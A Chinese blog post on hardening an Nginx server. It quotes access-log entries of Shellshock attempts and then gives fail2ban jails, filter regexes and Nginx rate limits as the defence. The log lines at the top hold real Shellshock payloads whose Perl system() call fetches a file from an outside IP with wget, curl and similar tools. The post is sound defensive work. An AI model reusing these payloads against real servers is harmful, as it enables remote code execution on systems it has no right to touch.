Title: Nginx发布web服务时的安全性配置
Date: 2015-08-31 13:22
Category: vps
Tags: vps nginx security
Summary: 使用Nginx发布web服务时的安全性配置.
Slug: security-configuration-of-nginx-web-service

##前言

在VPS上面搭建了一个peclican静态blog,以及其他的几个BS架构的web应用,

偶尔从nginx的log中发现,有人尝试远程执行代码,摘录部分log如下:
````
69.144.52.62 - - [30/Aug/2015:08:30:36 +0800] "GET /cgi-bin/php HTTP/1.1" 404 177 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://46.38.251.16/favicon.icon;curl http://46.38.251.16/favicon.icon;GET http://46.38.251.16/favicon.icon;lwp-download http://46.38.251.16/favicon.icon;lynx http://46.38.251.16/favicon.icon \x22);'"

77.86.48.104 - - [30/Aug/2015:11:20:06 +0800] "GET /cgi-bin/defaultwebpage.cgi HTTP/1.1" 404 177 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://46.38.251.16/favicon.icon;curl http://46.38.251.16/favicon.icon;GET http://46.38.251.16/favicon.icon;lwp-download http://46.38.251.16/favicon.icon;lynx http://46.38.251.16/favicon.icon \x22);'"

222.197.129.60 - - [30/Aug/2015:17:24:23 +0800] "GET /cgi-bin/php HTTP/1.1" 404 177 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://46.38.251.16/favicon.icon;curl http://46.38.251.16/favicon.icon;GET http://46.38.251.16/favicon.icon;lwp-download http://46.38.251.16/favicon.icon;lynx http://46.38.251.16/favicon.icon \x22);'"

203.83.250.217 - - [30/Aug/2015:20:59:20 +0800] "GET / HTTP/1.1" 200 4111 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://46.38.251.16/favicon.icon;curl http://46.38.251.16/favicon.icon;GET http://46.38.251.16/favicon.icon;lwp-download http://46.38.251.16/favicon.icon;lynx http://46.38.251.16/favicon.icon \x22);'"

221.163.252.76 - - [30/Aug/2015:22:19:50 +0800] "GET /cgi-bin/php4 HTTP/1.1" 404 177 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://46.38.251.16/favicon.icon;curl http://46.38.251.16/favicon.icon;GET http://46.38.251.16/favicon.icon;lwp-download http://46.38.251.16/favicon.icon;lynx http://46.38.251.16/favicon.icon \x22);'"
````

简单分析下,貌似是期望通过web下的cgi服务远程执行一些perl脚本.

不管怎么样,这种情况总是要想办法应对的.

##安全配置

考虑使用fail2ban检测nginx相关log的方法,将这些ip直接ban掉.

###fail2ban配置

在/etc/fail2ban/jail.local文件中,增加如下配置:
````
# Jail for Nginx request limit config
[nginx-req-limit]
enabled = true
filter = nginx-req-limit
action = iptables-multiport[name=ReqLimit, port="http,https", protocol=tcp]
logpath = /var/log/nginx/*error.log


# Ban clients that are searching for scripts on the website to execute and exploit
# If you do not use PHP or any other language in conjunction with your web server, 
# you can add this jail to ban those who request these types of resources
[nginx-noscript]
enabled  = true
port     = http,https
filter   = nginx-noscript
logpath  = /var/log/nginx/*access.log
maxretry = 6


# stop some known malicious bot request patterns
[nginx-badbots]
enabled  = true
port     = http,https
filter   = nginx-badbots
logpath  = /var/log/nginx/*access.log
maxretry = 2


# ban clients attempting to use our Nginx server as an open proxy
[nginx-noproxy]
enabled  = true
port     = http,https
filter   = nginx-noproxy
logpath  = /var/log/nginx/*access.log
maxretry = 2


[nginx-dos]
# Based on apache-badbots but a simple IP check (any IP requesting more than
# 240 pages in 60 seconds, or 4p/s average, is suspicious)
# Block for two full days.
# @author Yannick Warnier
enabled = true
port    = http,https
filter  = nginx-dos
logpath = /var/log/nginx/*access.log
findtime = 60
bantime  = 86400
maxretry = 120
````

针对上述配置,在/etc/fail2ban/filter.d中,增加如下一些文件:
````
nginx-req-limit.conf
# Fail2Ban configuration file
#
# supports: ngx_http_limit_req_module module

[Definition]

failregex = limiting requests, excess:.* by zone.*client: <HOST>

# Option: ignoreregex
# Notes.: regex to ignore. If this regex matches, the line is ignored.
# Values: TEXT
#
ignoreregex =
````

````
nginx-noscript.conf
[Definition]

failregex = ^<HOST> -.*GET.*(\.php|\.asp|\.exe|\.pl|\.cgi|\.scgi)

ignoreregex =
````

````
nginx-noproxy.conf
[Definition]

failregex = ^<HOST> -.*GET http.*

ignoreregex =
````

````
nginx-dos.conf
# Fail2Ban configuration file
#
# Generated on Fri Jun 08 12:09:15 EST 2012 by BeezNest
#
# Author: Yannick Warnir
#
# $Revision: 1 $
#

[Definition]
# Option:  failregex
# Notes.:  Regexp to catch a generic call from an IP address.
# Values:  TEXT
#
failregex = ^<HOST> -.*"(GET|POST).*HTTP.*"$

# Option:  ignoreregex
# Notes.:  regex to ignore. If this regex matches, the line is ignored.
# Values:  TEXT
#
ignoreregex =
````

````
cp apache-badbots.conf nginx-badbots.conf
````

最后重启fail2ban即可
````
service fail2ban restart
````

###nginx配置
在nginx的server配置中,限制并发数,并记录日志,配置如下:
````
limit_req_zone $binary_remote_addr zone=one:1m rate=10r/s;

#blog config
server {
    access_log /var/log/nginx/blog-access.log;

    limit_req zone=one burst=3 nodelay;

    ......
    
    location = / {
        # Instead of handling the index, just
        # rewrite / to /index.html
        rewrite ^ /index.html;
    }
    location / {
        # Serve a .gz version if it exists
        gzip_static on;
        # Try to serve the clean url version first
        try_files $uri.htm $uri.html $uri =404;
    }
    location = /favicon.ico {
        # This never changes, so don't let it expire
        expires max;
    }
    location ^~ /theme {
        # This content should very rarely, if ever, change
        access_log off;  # 这里的设置非常重要,可以避免将对静态文件的获取信息写入access log,也就避免了在fail2ban nginx-dos规则中误杀的可能.
        expires 60d;
    }
}
````

